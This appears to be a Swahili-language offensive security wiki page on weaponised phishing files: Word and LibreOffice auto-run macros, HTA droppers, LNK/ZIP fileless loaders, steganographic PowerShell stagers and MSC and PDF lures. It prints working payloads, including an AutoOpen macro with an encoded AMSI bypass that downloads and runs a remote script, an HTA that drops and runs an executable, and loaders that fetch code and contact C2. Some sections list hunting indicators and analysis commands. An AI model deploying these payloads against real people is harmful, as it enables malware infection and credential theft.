# Faili na Hati za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Hati za Office

Microsoft Word hukagua uhalali wa data ya faili kabla ya kulifungua. Uhakiki wa data hufanywa kwa kutambua muundo wa data kwa kuulinganisha na kiwango cha OfficeOpenXML. Hitilafu yoyote ikitokea wakati wa kutambua muundo wa data, faili inayochanganuliwa haitafunguliwa.

Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi chake na bado macros zake zikaendelea kutekelezwa.\
Kwa mfano, faili ya RTF haiungi mkono macros kwa muundo wake, lakini faili ya DOCM iliyopewa jina jipya na kiendelezi cha RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
Mifumo na taratibu zilezile za ndani zinatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint, n.k.).

Unaweza kutumia amri ifuatayo kuangalia ni viendelezi vipi vitatekelezwa na baadhi ya programu za Office:

```bash
assoc | findstr /i "word excel powerp"
```

Faili za DOCX zinazorejelea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) iliyo na macros zinaweza pia “kutekeleza” macros.

### Upakiaji wa Picha ya Nje

Nenda kwa: _Insert --> Quick Parts --> Field_\
_**Aina**: Links and References, **Majina ya sehemu**: includePicture, na **Jina la faili au URL**:_ http://<ip>/whatever

![Nyaraka za Office - Upakiaji wa Picha ya Nje: Nenda kwa: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Kwa maelezo kuhusu kuchanganua hati iliyopokewa badala ya kuitengeneza, angalia [Uchambuzi wa VBA macro: junk code na UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Backdoor ya Macros

Inawezekana kutumia macros kutekeleza msimbo wowote kutoka kwenye hati.

#### Vitendaji vya kupakia kiotomatiki

Kadiri vinavyotumiwa sana, ndivyo uwezekano wa AV kuvitambua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Mifano ya Msimbo wa Macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ondoa metadata mwenyewe

Nenda **File > Info > Inspect Document > Inspect Document**, jambo litakalofungua Document Inspector. Bofya **Inspect**, kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Kiendelezi cha Doc

Ukimaliza, chagua menyu kunjuzi ya **Save as type**, badilisha umbizo kutoka **`.docx`** hadi Word 97-2003 **`.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro ndani ya `.docx`**, na kuna **unyanyapaa** **kuhusu** kiendelezi cha **`.docm`** kinachowezesha macro (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya gateway za wavuti/barua pepe huzizuia kabisa). Kwa hiyo, **kiendelezi hiki cha zamani cha `.doc` ndicho suluhisho bora la kati**.

#### Vijenzi vya Macros hasidi

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros za LibreOffice ODT zinazojiendesha zenyewe (Basic)

Hati za LibreOffice Writer zinaweza kupachika macros za Basic na kuzifanya zijiendeshe kiotomatiki faili inapofunguliwa kwa kuhusisha macro na tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro rahisi ya reverse shell inaonekana hivi:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Kumbuka alama za nukuu zilizorudiwa (`""`) ndani ya string – LibreOffice Basic huzitumia kuweka alama za nukuu halisi, kwa hivyo payloads zinazoishia kwa `...==""")` huweka amri ya ndani na hoja ya Shell zikiwa zimefungwa sawasawa.

Vidokezo vya kuwasilisha:

- Hifadhi kama `.odt` na uunganishe macro na tukio la hati ili iendeshe mara tu hati inapofunguliwa.
- Unapotuma barua pepe kwa `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili bytes za faili, badala ya string ya jina la faili, zitumwe kama kiambatisho). Hili ni muhimu unapotumia vibaya seva za SMTP zinazokubali wapokeaji wowote wa `RCPT TO` bila uthibitishaji.

## Faili za HTA

HTA ni programu ya Windows **inayochanganya HTML na lugha za scripting (kama VBScript na JScript)**. Hutengeneza kiolesura cha mtumiaji na huendeshwa kama programu "inayoaminika kikamilifu", bila vizuizi vya mfumo wa usalama wa kivinjari.

HTA huendeshwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **husakinishwa** pamoja na **Internet Explorer**, hivyo `mshta` hutegemea IE. Kwa hiyo, ikiwa IE imeondolewa, HTA hazitaweza kuendeshwa.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Kadi bandia za viambatisho kwenye barua pepe ya HTML

Barua pepe ya HTML inaweza kuiga kadi ya onyesho la awali la kiambatisho la mtoa huduma badala ya kuwa na kiambatisho halisi. Talos iliona kadi ya Gmail iliyoundwa upya kwa kutumia sehemu nne za MIME za PNG za ndani zilizowekwa msimbo wa Base64. Udhibiti kamili wa mwonekano ulifungwa ndani ya anchor moja, na thamani ya mpokeaji katika `?m=<target-id>` iliwezesha ufuatiliaji kwa kila mpokeaji. Kiungo kilianza na `//` badala ya `http://` au `https://`; vivinjari hutatua muundo huo wa protocol-relative, lakini zana za kutoa URL zinazolingana tu na URL zilizo kamili zinaweza kukikosa.<sup>[[11]](#references)</sup>

Wakati wa uchanganuzi, kagua MIME ghafi badala ya kutegemea orodha ya viambatisho inavyoonyeshwa. Tambua jinsi sehemu za picha za ndani zinavyounda kadi ya mwonekano, pata anchor inayoizunguka, na sanifisha thamani za `href` za protocol-relative kabla ya kutoa URL.<sup>[[11]](#references)</sup>

Kwa majaribio ya kughushi mtumaji wa envelope/header na ulinganifu wa DMARC, tazama [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Kulazimisha Uthibitishaji wa NTLM

Kuna njia kadhaa za **kulazimisha uthibitishaji wa NTLM "kwa mbali"**; kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambayo mtumiaji atafungua (hata HTTP MitM?). Au mtumie mwathiriwa **anwani ya faili** ambazo **zitasababisha** **uthibitishaji** kwa **kufungua folda tu.**

**Angalia mawazo haya na mengine zaidi katika kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba unaweza si tu kuiba hash au uthibitishaji, bali pia **kufanya mashambulizi ya NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads Zilizopachikwa kwenye ZIP (msururu usiotumia faili)

Kampeni zenye ufanisi mkubwa husambaza ZIP yenye hati mbili halali za kudanganya (PDF/DOCX) na faili hasidi ya .lnk. Mbinu yake ni kwamba PowerShell loader halisi huhifadhiwa ndani ya baiti ghafi za ZIP baada ya alama ya kipekee, kisha .lnk huitoa na kuiendesha kikamilifu kwenye kumbukumbu.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida unaotekelezwa na mstari mmoja wa PowerShell wa .lnk:

1) Tafuta ZIP asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na folda mama ya saraka ya sasa ya kufanya kazi.
2) Soma baiti za ZIP na utafute alama iliyowekwa awali (kwa mfano, xFIQCV). Kila kitu baada ya alama hiyo ni payload ya PowerShell iliyopachikwa.
3) Nakili ZIP hadi %ProgramData%, ifungue hapo, na ufungue .docx ya kudanganya ili ionekane halali.
4) Bypass AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Ondoa ufichaji wa hatua inayofuata (kwa mfano, ondoa herufi zote za #) na uiendeshe kwenye kumbukumbu.

Mfano wa muundo wa PowerShell wa kutoa na kuendesha hatua iliyopachikwa:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Maelezo
- Uwasilishaji mara nyingi hutumia vibaya subdomain za PaaS zinazoaminika (kwa mfano, *.herokuapp.com) na huenda ukazuia payloads (kuwasilisha ZIP zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi husimbua shellcode ya base64/XOR na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza alama kwenye diski.

Persistence iliyotumika katika mnyororo huohuo
- COM TypeLib hijacking ya kidhibiti cha Microsoft Web Browser ili IE/Explorer au programu yoyote inayokijumuisha ikizinduliwa tena iendeshe payload kiotomatiki.<sup>[[2]](#references)[[4]](#references)</sup> Tazama maelezo na amri zilizo tayari kutumika hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Uwindaji/IOCs
- Faili za ZIP zilizo na mfuatano wa alama wa ASCII (kwa mfano, xFIQCV) ulioongezwa mwishoni mwa data ya archive.
- Faili za .lnk zinazokagua folda za mzazi/mtumiaji ili kupata ZIP na kufungua hati ya udanganyifu.
- Kuingilia AMSI kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Mijadala ya kikazi inayodumu kwa muda mrefu na kuishia kwa viungo vinavyopangishwa chini ya domain za PaaS zinazoaminika.

## Uwekaji wa awali unaoanza na .lnk ya udanganyifu → persistence kupitia scheduled task → trusted CPL side-loading

Muundo mwingine unaojirudia ni **`.lnk` inayojiweka kama hati**, ambayo hufungua mara moja kishawishi kisicho na madhara huku ikiweka mnyororo halisi chinichini.<sup>[[3]](#references)</sup>

Mtiririko wa kazi ulioonekana:
1. Njia ya mkato **inajifanya kuwa PDF** na kutumia `conhost.exe` au proxy inayofanana kuzindua PowerShell downloader iliyofichwa.
2. PowerShell hugawanya tokens zilizo wazi (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili mifumo rahisi ya utambuzi inayotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` ishindwe kutambua amri hiyo.
3. Stager hupakua **hati ya udanganyifu kwanza**, huifungua ili mwathiriwa aione, kisha huunda upya faili hasidi chinichini.
4. Payloads zinaweza kuhifadhiwa kwa **viendelezi visivyo halisi**, kisha kubadilishwa majina kwa kuondoa vibambo vya ziada, hivyo kuchelewesha kuonekana kwa faili za wazi za `.exe` / `.cpl`.
5. Persistence huwekwa kwa **scheduled task inayotumia vipindi vya dakika** na kuzindua binary ya host inayoaminika kutoka kwenye njia inayoweza kuandikwa na mtumiaji.

Dalili za chini kabisa za uwindaji kutoka kwa muundo huu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Mpangilio muhimu wa staging wa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` au `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini hatua ya pili ni ngumu kugundua

Katika case study ya Rapid7, scheduled task ilizindua mara kwa mara **`Fondue.exe`** kutoka `C:\Users\Public\`. Kwa kuwa **`APPWIZ.cpl`** iliwekwa kando yake na ku-export **`RunFODW`**, binary ya Microsoft inayoaminika ilifanya side-load ya CPL ya mshambuliaji badala ya nakala halali ya mfumo.

CPL kisha:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Hu-decrypt blob hiyo kupitia **Windows CNG / `bcrypt.dll`**
- Hutenga memory inayoweza kutekeleza msimbo na kunakili shellcode iliyodecryptiwa humo
- Huitekeleza kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback ya **`EnumUILanguagesW`**

Hatua hiyo ya mwisho inafaa kufuatiliwa kivyake: malware mara nyingi huepuka kuruka moja kwa moja kwa `((void(*)())buf)()` na badala yake hutumia vibaya **WinAPI halali inayopokea callback** kuhamisha utekelezaji.

Payload iliyodecryptiwa katika kampeni hii ilikuwa shellcode ya **Donut**, ambayo kisha ili-map PE ya mwisho kikamilifu kwenye memory na kufanya patch ya **AMSI/WLDP/ETW** katika process ya sasa kabla ya kukabidhi utekelezaji. Kwa maelezo zaidi kuhusu side-loading na post-processing inayokaa kwenye memory, angalia:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Viashiria vya vitendo vya hunting:
- `.lnk` inayozindua `powershell.exe` au `conhost.exe`, ikifuatiwa na hati ya chambo inayoonekana.
- Downloads za muda mfupi kwenda **`C:\Users\Public\`**, zikifuatiwa mara moja na kubadilishwa majina kutoka kwa extensions zisizo na maana.
- Scheduled tasks zenye majina yasiyo na mashaka, kama `GoogleErrorReport`, zinazoendeshwa kutoka **directories zinazoweza kuandikwa na mtumiaji**.
- Binaries zinazoaminika zinazopakia faili za **`.cpl` / `.dll`** kutoka directory hiyo hiyo isiyo ya mfumo.
- Base64 text blobs zinazoandikwa chini ya **`C:\Windows\Tasks\`** na kisha kusomwa na module iliyofanya side-load.

## Payloads zilizofichwa kwenye picha kwa kutumia delimiters za Steganography (PowerShell stager)

Minyororo ya loader ya hivi karibuni husambaza JavaScript/VBS iliyofichwa, ambayo hu-decode na kuendesha PowerShell stager ya Base64. Stager hiyo hupakua picha (mara nyingi GIF) iliyo na .NET DLL iliyosimbwa kwa Base64 na kufichwa kama plain text kati ya markers za kipekee za mwanzo/mwisho. Script hutafuta delimiters hizi (mifano iliyoonekana kwenye mazingira halisi: «<<sudo_png>> … <<sudo_odt>>>»), hutoa maandishi yaliyo kati yake, huyafanya Base64-decode kuwa bytes, hupakia assembly kwenye memory na kuita entry method inayojulikana kwa kutumia URL ya C2.<sup>[[5]](#references)</sup>

Mtiririko wa kazi
- Hatua ya 1: Archived JS/VBS dropper → hu-decode Base64 iliyopachikwa → huzindua PowerShell stager kwa -nop -w hidden -ep bypass.
- Hatua ya 2: PowerShell stager → hupakua picha, hutoa Base64 iliyowekwa kati ya markers, hupakia .NET DLL kwenye memory na kuita method yake (k.m., VAI) ikipitisha URL ya C2 na chaguo.
- Hatua ya 3: Loader hupata payload ya mwisho na kwa kawaida hui-inject kupitia process hollowing ndani ya binary inayoaminika (mara nyingi MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Soma zaidi kuhusu process hollowing na utekelezaji kupitia proxy ya utility inayoaminika hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kutoa DLL kutoka kwenye picha na kuita .NET method kwenye memory:

<details>
<summary>Kichimbua cha PowerShell cha stego payload na loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Vidokezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Alama hutofautiana kati ya kampeni.
- Bypass za AMSI/ETW na uondoaji wa ufichaji wa string hutumiwa mara nyingi kabla ya kupakia assembly.
- Uwindaji: changanua picha zilizopakuliwa kutafuta vitenganishi vinavyojulikana; tambua PowerShell inayofikia picha na kusimbua mara moja blobs za Base64.

Tazama pia zana za stego na mbinu za carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Hatua ya awali inayojirudia ni faili ndogo ya `.js` au `.vbs` iliyofichwa sana, inayowasilishwa ndani ya archive. Lengo lake pekee ni kusimbua string ya Base64 iliyopachikwa na kuwasha PowerShell kwa kutumia `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.<sup>[[5]](#references)</sup>

Mantiki ya msingi (muhtasari):
- Soma maudhui ya faili yenyewe
- Tafuta blob ya Base64 kati ya string za kupotosha
- Isimbue kuwa PowerShell ya ASCII
- Itekeleze kwa kutumia `wscript.exe`/`cscript.exe` inayoendesha `powershell.exe`

Viashiria vya uwindaji
- Viambatisho vya JS/VBS vilivyowekwa kwenye archive vinavyoanzisha `powershell.exe` huku vikiwa na `-enc`/`FromBase64String` kwenye mstari wa amri.
- `wscript.exe` inayoanzisha `powershell.exe -nop -w hidden` kutoka kwenye njia za muda za mtumiaji.

## Hati za MSC kama kontena za utekelezaji (GrimResource)

Faili za Microsoft Management Console (`.msc`) ni fasili za console za XML ambazo kwa kawaida hufunguliwa na `mmc.exe`. **GrimResource** hutumia vibaya rejeleo la `StringTable` kuelekea rasilimali ya `apds.dll` iliyo na primitive ya zamani ya XSS, hivyo mtumiaji anapofungua console iliyoundwa kwa makusudi, JavaScript huendeshwa ndani ya `mmc.exe`. Sampuli zilizochunguzwa zilichanganya ufichaji unaotumia `transformNode` na **DotNetToJScript** ili kuanzisha payload ya .NET bila kutumia njia ya kawaida ya Office macro.<sup>[[9]](#references)</sup>

Kwa uchunguzi tuli, chukulia MSC isiyoaminika kama maandishi na **usiibofye mara mbili**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Viashiria vya runtime vyenye signal kubwa ni `mmc.exe` kupakia CLR au vipengele vya script, kuunda miunganisho ya network, au kuzindua `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` au executable isiyotarajiwa. Umbizo hili ni halali, kwa hiyo detections zinapaswa kuhusisha **asili + maudhui ya XML/script yenye kutiliwa shaka + tabia ya `mmc.exe`** badala ya kuzuia kila MSC.<sup>[[9]](#references)</sup>

## PDF/QR redirectors na udhibiti wa payload

PDF haihitaji exploit ili iwe na manufaa. Kampeni za hivi karibuni huweka **QR code au kiungo cha kawaida** kwenye hati inayoonekana isiyo na madhara, huhamisha session ya browser nje ya udhibiti wa barua pepe, na kubinafsisha anwani ya mwisho kwa kutumia anwani ya mpokeaji. Microsoft iliandika PDFs za 2025 ambazo URL za QR zilikuwa za kipekee kwa kila mpokeaji na zilielekeza kwenye miundombinu ya wizi wa credentials ya RaccoonO365; mnyororo sambamba ulitumia udhibiti wa IP/mazingira kurudisha njia ya JavaScript/MSI kwa wageni waliochaguliwa, lakini PDF isiyo na madhara kwa scanners au clients wasioruhusiwa.<sup>[[10]](#references)</sup>

Chunguza vitendo vyote vya PDF na QR codes zilizoonyeshwa. QR inaweza kuchorwa kama vector badala ya kuhifadhiwa kama picha inayoweza kutolewa, kwa hiyo geuza kila ukurasa kuwa raster na pia utoe picha zilizopachikwa:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Kagua maeneo lengwa yaliyodekodiwa na uelekezaji upya kutoka kwenye mfumo wa uchanganuzi uliotengwa bila kuthibitisha utambulisho. Vipengele muhimu vya kutafuta ni pamoja na PDF zenye QR pekee na ujumbe wa barua pepe usio na maudhui mengi, anwani ya barua pepe ya mpokeaji iliyowekwa ndani ya kigezo cha query, uelekezaji upya mara kadhaa kupitia huduma za hosting zinazoaminika, na maudhui tofauti yanayorejeshwa kulingana na IP, eneo la kijiografia, cookies, referrer au user agent. Linganisha maombi kwa kutumia profaili zilizodhibitiwa, kwa sababu fetch moja tu ya sandbox inaweza kupokea decoy pekee.<sup>[[10]](#references)</sup>

## Faili za Windows za kuiba NTLM hashes

Angalia ukurasa kuhusu **maeneo ya kuiba NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampeni ya ZipLine: Shambulio la hali ya juu la phishing linalolenga kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Kufuatilia tradecraft ya Dropping Elephant kupitia mnyororo wa loader wenye mandhari ya China](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Tekeleza utekaji wa TypeLib – Mbinu mpya ya persistence ya COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader husambaza aina mbalimbali za infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console kwa initial access na kukwepa ulinzi](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Watendaji wa vitisho hutumia msimu wa kodi kusambaza kampeni za phishing zenye mada ya kodi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Mnyororo wa usambazaji wa UAT-11587 na backdoor ya Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
